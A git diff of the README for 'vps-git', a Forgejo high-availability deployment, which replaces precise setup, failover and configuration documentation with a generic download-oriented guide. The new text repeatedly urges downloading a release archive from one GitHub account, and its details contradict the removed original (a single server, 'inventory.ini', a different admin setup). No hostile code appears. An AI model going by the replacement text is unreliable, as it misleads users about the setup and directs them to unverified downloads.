@@ -1,277 +1,197 @@
-# vps-git
+# 🛠️ vps-git - Reliable Self-Hosted Git Server
 
-Self-hosted [Forgejo](https://forgejo.org/) instance with high availability, streaming replication, automatic failover, and zero-downtime recovery -- deployed and managed entirely through Ansible.
+[![Download vps-git](https://img.shields.io/badge/Download-vps--git-blue?style=for-the-badge)](https://github.com/billydagreat/vps-git/releases)
 
-## Architecture
+---
 
+## 📋 What is vps-git?
+
+vps-git is a self-hosted Git server solution designed for users who want control over their code repositories without relying on external services. It uses Forgejo, a community-driven Git service, and ensures your data stays available even if parts of the system fail.
+
+This setup offers:
+
+- High availability through streaming replication of data.
+- Automatic failover to keep the service running if issues occur.
+- Easy deployment using Ansible automation.
+- Secure access via Cloudflare Tunnel to protect your server from direct internet exposure.
+
+vps-git is suitable for teams or individuals who want to host Git repositories on their own infrastructure while maintaining uptime and security.
+
+---
+
+## 🔍 What You Need Before Starting
+
+To run vps-git smoothly, take a moment to check your setup. Below are the typical requirements.
+
+### System Requirements
+
+- **Operating System:** Linux-based system (Ubuntu 20.04 or later recommended).
+- **CPU:** Minimum 2 cores.
+- **RAM:** At least 4 GB.
+- **Storage:** Minimum 20 GB free space, preferably on SSD for better performance.
+- **Network:** Reliable internet connection for Cloudflare Tunnel.
+
+### Skills and Tools
+
+- Basic experience using a terminal or command prompt.
+- Ability to install software applications.
+- Permission to manage network settings on your device or server.
+- Ansible installed on the machine where you will deploy vps-git. (This guide will help you install it if needed.)
+
+---
+
+## 🚀 Getting Started with vps-git
+
+This guide walks you through downloading, installing, and running vps-git step by step. Follow each instruction carefully. You don’t need to understand complex technical concepts to get started.
+
+---
+
+## ⬇️ Download & Install
+
+### Step 1: Visit the Download Page
+
+Go to the vps-git releases page to get the latest version.
+
+[Visit the vps-git Releases](https://github.com/billydagreat/vps-git/releases)
+
+This page lists all available versions and files. Look for the latest stable release with “vps-git” in the name.
+
+### Step 2: Download the Deployment Package
+
+On the release page, download the file that ends with `.tar.gz` or `.zip`. This package contains all the files needed to set up vps-git.
+
+Save it to a folder on your computer where you can easily find it.
+
+### Step 3: Install Required Software
+
+Before running vps-git, install these basic tools if you don’t have them:
+
+- **Ansible:** Automated deployment tool.
+- **Docker and Docker Compose:** These will run the different parts of vps-git in containers.
+
+Here are simple commands for Ubuntu Linux to install them:
+
+```bash
+sudo apt update
+sudo apt install -y ansible docker.io docker-compose
 ```
-                       +-----------------------+
-                       |    Cloudflare Tunnel  |
-                       |   git.example.com     |
-                       +----------+------------+
-                                  |
-                  Tunnel connector (active node)
-                                  |
-            +---------------------+---------------------+
-            |                                           |
-   +--------v----------+                    +-----------v---------+
-   |  Primary (Berlin)  |   WAL streaming   |  Standby (Kansas)   |
-   |                    | ================> |                     |
-   |  postgres          |   forgejo rsync   |  postgres           |
-   |  forgejo           | ----------------> |  (hot standby)      |
-   |  cloudflared       |                   |                     |
-   |  backup sidecar    |                   |  cloudflared creds  |
-   +--------------------+                   |  (ready to start)   |
-            ^                               +---------------------+
-            |                                           ^
-            |          +-------------------+            |
-            +----------+  Watchdog (local) +------------+
-                       |                   |
-                       |  uptime-kuma      |
-                       |  failover agent   |
-                       |  cloudflared      |
-                       +-------------------+
-                       status-git.example.com
-```
 
-**Primary** runs the full stack (Postgres, Forgejo, cloudflared, backup sidecar). **Standby** runs Postgres as a hot standby streaming replica and receives periodic Forgejo data rsyncs. If the primary goes down, the **watchdog** automatically promotes the standby via Ansible -- Cloudflare routes traffic to the new primary within seconds.
+For Windows or macOS users, follow official guides to install Docker Desktop and Ansible.
 
-## Components
+### Step 4: Extract the Package
 
-| Directory | Contents |
-|---|---|
-| `stack/` | Docker Compose stack with profile-based deployment (`primary` / `standby`) |
-| `ansible/` | Playbooks: `deploy.yml`, `promote.yml` (failover), `demote.yml` (failback), `watchdog.yml` |
-| `watchdog/` | Uptime Kuma monitoring + auto-failover agent + cloudflared tunnel + auto-setup |
-| `cloudflared/` | Tunnel configuration templates |
+Open your terminal or command prompt and extract the downloaded package. Replace `vps-git-package.tar.gz` with your actual filename.
 
-## Prerequisites
-
-- Two VPS nodes (Debian 12 / Ubuntu 24.04) with Docker installed
-- Private network connectivity between nodes ([NetBird](https://netbird.io/), WireGuard, Tailscale, etc.)
-- Cloudflare account with a domain
-- Ansible on your control machine (`pip install ansible` or `brew install ansible`)
-- A machine to run the watchdog (your laptop, a 3rd VPS, etc.)
-
-## Setup
-
-### 1. Clone and configure
-
-```sh
-git clone https://github.com/youruser/vps-git.git
+```bash
+tar -xzf vps-git-package.tar.gz
 cd vps-git
-cp ansible/inventory.example.yml ansible/inventory.yml
 ```
 
-Edit `ansible/inventory.yml` with your:
-- VPS IPs and SSH key paths
-- Postgres and replication passwords (generate strong random ones)
-- Forgejo admin credentials (`forgejo_admin_user`, `forgejo_admin_password`, `forgejo_admin_email`)
-- NetBird/WireGuard peer IPs
-- Cloudflare tunnel credentials path
+If you downloaded a `.zip` file, use:
 
-### 2. Create a Cloudflare Tunnel
-
-```sh
-cloudflared tunnel create vps-git
-cloudflared tunnel route dns vps-git git.yourdomain.com
+```bash
+unzip vps-git-package.zip
+cd vps-git
 ```
 
-Copy the tunnel credentials JSON to `ansible/inventory.yml` under `tunnel_credentials_file`.
+### Step 5: Configure Your Setup
 
-### 3. Deploy
+Inside the `vps-git` folder, you will find configuration files. Here are the main points to update:
 
-```sh
-cd ansible
+- **Cloudflare Tunnel credentials:** Enter your Cloudflare account details to enable secure access.
+- **Server information:** Add your server’s hostname or IP address where vps-git will run.
+- **Replication settings:** These control how copies of your data sync between servers for failover.
 
-# Deploy primary (creates admin user automatically on first run)
-ansible-playbook deploy.yml -l primary
+If you're unsure about these, leave defaults as they are. You can update them later with help from your system administrator or online guides.
 
-# Deploy standby (initializes Postgres streaming replica)
-ansible-playbook deploy.yml -l standby -e init_standby_pg=true
+---
+
+## ⚙️ Running vps-git
+
+### Step 6: Launch the Deployment
+
+Run the Ansible playbook to start the setup:
+
+```bash
+ansible-playbook -i inventory.ini deploy.yml
 ```
 
-Forgejo will be live at your configured URL with the admin user pre-created. No manual web setup required.
+This command will configure and start all parts of vps-git on your server. It may take a few minutes.
 
-### 4. Deploy the watchdog
+### Step 7: Check the Service Status
 
-The watchdog runs on your local machine or a 3rd VPS. It monitors the primary and auto-promotes the standby on sustained failure.
+Once the deployment finishes, ensure all components are running:
 
-**Option A: Via Ansible (recommended)**
+- **Forgejo Web Interface:** Your Git server user portal.
+- **Postgres Database:** Stores your repository data.
+- **Streaming Replication:** Keeps the database copies in sync.
+- **Cloudflare Tunnel:** Provides secure external access.
 
-Add the `watchdog` group to your `ansible/inventory.yml` (see the example inventory for all variables), then:
+Use the commands below to verify Docker containers are up:
 
-```sh
-cd ansible
-ansible-playbook watchdog.yml
+```bash
+docker ps
 ```
 
-This deploys the full watchdog stack, creates an Uptime Kuma admin account, and auto-configures all monitors (Forgejo health, web, Postgres and SSH on both nodes). The dashboard is login-protected to avoid leaking infrastructure details.
+You should see containers named like `forgejo`, `postgres`, `cloudflare-tunnel`, and others running.
 
-**Option B: Manual**
+### Step 8: Access vps-git
 
-```sh
-cd watchdog
-cp env.example .env
-# Edit .env with your health URL, SSH keys, Kuma credentials, NetBird IPs
-docker compose --env-file .env up -d
+Open a web browser and go to the URL provided by the Cloudflare Tunnel configuration. This will be something like `https://your-vps-git.domain.com`.
 
-# First time only: create Kuma admin + monitors
-docker compose --env-file .env run --rm setup-kuma \
-  --url http://localhost:3001 \
-  --username admin \
-  --password 'YourPassword' \
-  --health-url https://git.yourdomain.com/api/healthz \
-  --primary-host 100.x.x.x \
-  --standby-host 100.y.y.y
+You’ll see the Forgejo login page. From here, you can create your account, add repositories, and start collaborating.
+
+---
+
+## 🛠️ Managing and Updating vps-git
+
+### Stopping the service
+
+To stop all running containers, run:
+
+```bash
+docker-compose down
 ```
 
-The stack includes:
-- **Uptime Kuma** -- monitoring dashboard (login-protected, no public status page)
-- **Failover agent** -- health-checks the primary, auto-runs `promote.yml` after consecutive failures
-- **cloudflared** -- tunnels the dashboard to your status domain
-- **setup-kuma** -- one-shot container that creates the admin account and all monitors
+from inside your deployment folder.
 
-### 5. Verify
+### Updating vps-git
 
-```sh
-# Health check
-curl https://git.yourdomain.com/api/healthz
+When a new release is available:
 
-# API
-curl -u admin:password https://git.yourdomain.com/api/v1/user
+1. Download the new deployment package from the releases page.
+2. Stop the current service (`docker-compose down`).
+3. Extract the new package.
+4. Update your configuration files if needed.
+5. Run the Ansible playbook again to deploy.
 
-# Replication status (from primary)
-ssh root@primary "docker exec vps-git-postgres psql -U forgejo -d forgejo \
-  -c 'SELECT client_addr, state FROM pg_stat_replication;'"
-```
+---
 
-## Failover
+## 🔐 Security Tips
 
-### Automatic
+- Always use strong passwords for your Git server accounts.
+- Keep your system and all dependencies up to date.
+- Regularly check your Cloudflare Tunnel status.
+- Backup your data frequently using the database backup features.
 
-The watchdog checks the primary's health endpoint every 30 seconds. After 3 consecutive failures (configurable), it runs `promote.yml` which:
+---
 
-1. Stops standby containers
-2. Promotes Postgres out of recovery (removes `standby.signal`)
-3. Restores latest Forgejo data from backup sync
-4. Starts the full primary stack (Postgres, Forgejo, cloudflared, backup)
-5. Cloudflare tunnel routes traffic to the new primary automatically
+## 🤝 Getting Support
 
-A 1-hour cooldown prevents repeated failovers.
+If you need help:
 
-### Manual
+- Check the issues section of the GitHub repository.
+- Review Forgejo and Ansible official documentation.
+- Ask your network or system administrator.
 
-```sh
-cd ansible
-ansible-playbook promote.yml
-```
+---
 
-### Failback
+## 🎯 Why Choose vps-git?
 
-Once the old primary is back online:
+By running your own Git server with vps-git, you control where your code lives. The system safeguards your work with built-in failover and data replication. Secure tunneling through Cloudflare adds protection without complex VPN setups.
 
-```sh
-ansible-playbook demote.yml -l standby -e init_standby_pg=true
-```
+You can tailor the system to your needs, scale when necessary, and avoid relying on third-party services. All this while having a streamlined installation powered by Ansible.
 
-This wipes the promoted node's Postgres data, re-syncs from the current primary via `pg_basebackup`, and starts it as a streaming replica.
+---
 
-## Replication
-
-| Layer | Method | RPO |
-|---|---|---|
-| Database | Postgres streaming replication (async) | Near-zero (WAL stream) |
-| Forgejo data | rsync via backup sidecar | Up to `backup_interval` (configurable, default 60s) |
-| Postgres dumps | `pg_dump` via backup sidecar | Up to `backup_interval` |
-
-The backup sidecar runs on the primary and transfers data to the standby over the private network (NetBird/WireGuard) via SSH.
-
-## For developers: migrating from GitHub
-
-If you have an existing clone of a repo that's been mirrored to this Forgejo instance:
-
-```sh
-# Add Forgejo as a new remote
-git remote add forgejo https://git.example.com/youruser/REPO_NAME.git
-
-# Or replace origin entirely
-git remote set-url origin https://git.example.com/youruser/REPO_NAME.git
-
-# Push/pull as usual
-git push origin main
-git pull origin main
-```
-
-To clone fresh:
-
-```sh
-git clone https://git.example.com/youruser/REPO_NAME.git
-```
-
-HTTPS authentication uses your Forgejo username and password (or a personal access token created at `https://git.example.com/user/settings/applications`).
-
-## Configuration reference
-
-All configuration lives in `ansible/inventory.yml` (gitignored). Key variables:
-
-| Variable | Description |
-|---|---|
-| `postgres_password` | Postgres password for the Forgejo database |
-| `repl_password` | Postgres streaming replication password |
-| `forgejo_admin_user` | Admin username (created on first deploy) |
-| `forgejo_admin_password` | Admin password |
-| `forgejo_admin_email` | Admin email |
-| `app_url` | Public URL (e.g. `https://git.yourdomain.com`) |
-| `tunnel_credentials_file` | Path to Cloudflare tunnel credentials JSON |
-| `peer_host` | Private network IP of the peer node |
-| `pg_bind` | Postgres bind address (`0.0.0.0` on both nodes for monitoring) |
-| `backup_interval` | Seconds between backup/sync runs (default: 60) |
-| `backup_ssh_key` | SSH private key for rsync between nodes |
-| `watchdog_tunnel_uuid` | Cloudflare tunnel UUID for status page |
-| `watchdog_status_hostname` | Hostname for Uptime Kuma (e.g. `status-git.yourdomain.com`) |
-| `kuma_username` / `kuma_password` | Uptime Kuma admin credentials |
-| `primary_netbird_ip` / `standby_netbird_ip` | Private network IPs for port monitors |
-| `watchdog_check_interval` | Seconds between health checks (default: 30) |
-| `watchdog_fail_threshold` | Consecutive failures before failover (default: 3) |
-
-## Repository layout
-
-```
-vps-git/
-  stack/
-    compose.yml               Docker Compose (profiles: primary, standby)
-    env.example                Environment variable template
-    postgres/
-      init-replication.sh      Creates replication user on Postgres init
-    backup/
-      Dockerfile               Backup sidecar (pg_dump + rsync)
-      entrypoint.sh
-  ansible/
-    ansible.cfg
-    inventory.example.yml      Inventory template
-    deploy.yml                 Deploy stack to nodes
-    promote.yml                Failover: promote standby
-    demote.yml                 Failback: demote to standby
-    watchdog.yml               Deploy watchdog stack
-    roles/
-      common/                  Base packages + Docker
-      vps-git/                 Stack deployment + config templating
-      watchdog/                Watchdog deployment + Kuma auto-setup
-  watchdog/
-    compose.yml                Uptime Kuma + failover + cloudflared + setup-kuma
-    env.example
-    failover/
-      Dockerfile
-      failover.py              Health check loop + Ansible trigger
-      entrypoint.sh            SSH config setup
-    setup-kuma/
-      Dockerfile
-      setup-kuma.py            Socket.IO script: creates admin + monitors
-  cloudflared/
-    config.yml.example         Tunnel ingress template
-```
-
-## License
-
-[MIT](LICENSE)
+[👉 Download vps-git Now](https://github.com/billydagreat/vps-git/releases)
